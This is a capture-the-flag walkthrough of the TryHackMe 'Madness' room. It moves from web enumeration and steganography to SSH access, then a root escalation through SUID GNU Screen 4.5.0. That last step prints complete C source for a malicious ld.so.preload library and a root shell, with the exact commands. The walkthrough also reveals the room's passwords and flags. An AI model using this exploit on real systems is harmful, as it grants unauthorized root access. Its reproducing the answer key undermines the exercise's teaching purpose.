# TryHackMe — Madness

**Difficulty:** Easy  
**Tags:** Steganography, Web, Linux Privilege Escalation  
**IP:** `10.146.144.11`

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV 10.146.144.11
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Two open ports: SSH and Apache web server on default port 80.

### Web Enumeration

Browsing to port 80 shows the Apache2 Ubuntu Default Page. A `gobuster` scan reveals only `index.php`:

```bash
gobuster dir -u http://10.146.144.11/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
```

```
/index.php  (Status: 200) [Size: 11320]
```

---

## Foothold

### Hidden Comment in Page Source

Inspecting the HTML source of the default page reveals a hidden comment and an embedded image:

```html
<img src="thm.jpg" class="floating_element"/>
<!-- They will never find me-->
```

### Fixing the Broken Image

The image `thm.jpg` fails to render in the browser. Downloading and inspecting it reveals the issue — the file has **PNG magic bytes** but is actually a JPEG:

```bash
wget http://10.146.144.11/thm.jpg
xxd thm.jpg | head -3
```

```
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
```

The first bytes `89 50 4E 47` are the PNG signature, but the rest of the data is JPEG. Fixing the header with a proper JFIF signature:

```bash
printf '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' | dd of=thm.jpg bs=1 count=20 conv=notrunc
```

```bash
file thm.jpg
# thm.jpg: JPEG image data, JFIF standard 1.01, 400x400
```

Opening the repaired image reveals a hidden directory path: `/th1s_1s_h1dd3n`

### Brute-Forcing the Secret

Navigating to `http://10.146.144.11/th1s_1s_h1dd3n/` shows a page asking to "guess my secret." The HTML source contains a hint:

```html
<!-- It's between 0-99 but I don't think anyone will look here-->
```

Brute-forcing the `secret` GET parameter:

```bash
for i in $(seq 0 99); do
  resp=$(curl -s "http://10.146.144.11/th1s_1s_h1dd3n/index.php?secret=$i")
  if ! echo "$resp" | grep -q "That is wrong"; then
    echo "Found: $i"
    echo "$resp"
    break
  fi
done
```

The correct value is **73**, which reveals the string: `y2RPJ4QaPF!B`

### Steganography — Extracting the Username

Using `steghide` with the discovered password on the repaired image extracts a hidden file:

```bash
steghide extract -sf thm.jpg -p 'y2RPJ4QaPF!B'
# wrote extracted data to "hidden.txt"
```

```
Fine you found the password!
Here's a username
wbxre
```

The username `wbxre` is ROT13-encoded:

```bash
echo 'wbxre' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# joker
```

### Steganography — Extracting the Password

A second image provided on the room page contains another hidden file. Using `stegseek` to crack it:

```bash
wget https://assets.tryhackme.com/additional/imgur/5iW7kC8.jpg
stegseek 5iW7kC8.jpg /usr/share/wordlists/rockyou.txt
```

```
[i] Found passphrase: ""
[i] Original filename: "password.txt"
```

```bash
cat password.txt
# I didn't think you'd find me! Congratulations!
# Here take my password
# *axA&GF8dP
```

### SSH Access

```bash
ssh joker@10.146.144.11
# Password: *axA&GF8dP
```

### User Flag

```bash
cat ~/user.txt
# THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

---

## Privilege Escalation

### SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the results, an unusual SUID binary stands out:

```
/bin/screen-4.5.0
```

### GNU Screen 4.5.0 — Local Privilege Escalation

GNU Screen 4.5.0 has a known local privilege escalation vulnerability. Because Screen runs with SUID root, it can write files as root. The exploit abuses `/etc/ld.so.preload` — a system file that forces shared libraries to load before any program executes.

**Step 1 — Create a malicious shared library (`libhax.so`):**

```c
// libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void) {
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
}
```

When loaded, this library sets `/tmp/rootshell` to be owned by root with SUID permissions.

**Step 2 — Create a root shell binary (`rootshell`):**

```c
// rootshell.c
#include <stdio.h>
int main(void) {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL);
}
```

**Step 3 — Compile and execute:**

```bash
cd /tmp
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -o rootshell rootshell.c

cd /etc
umask 000
/bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
/bin/screen-4.5.0 -ls
/tmp/rootshell
```

**Exploit chain:**
1. Screen (running as root via SUID) writes `/tmp/libhax.so` into `/etc/ld.so.preload`
2. Next time Screen runs, the system preloads `libhax.so`, which sets SUID root on `/tmp/rootshell`
3. Executing `/tmp/rootshell` spawns a root shell

### Root Flag

```bash
whoami
# root
cat /root/root.txt
# THM{5ecd98aa66a6abb670184d7547c8124a}
```

---

## Summary

| Step | Technique |
|------|-----------|
| Recon | Nmap, Gobuster |
| Web | Hidden HTML comment, broken image magic bytes |
| Stego | steghide extraction, ROT13 decode, stegseek brute-force |
| Access | SSH with recovered credentials |
| Privesc | GNU Screen 4.5.0 SUID → ld.so.preload exploit |
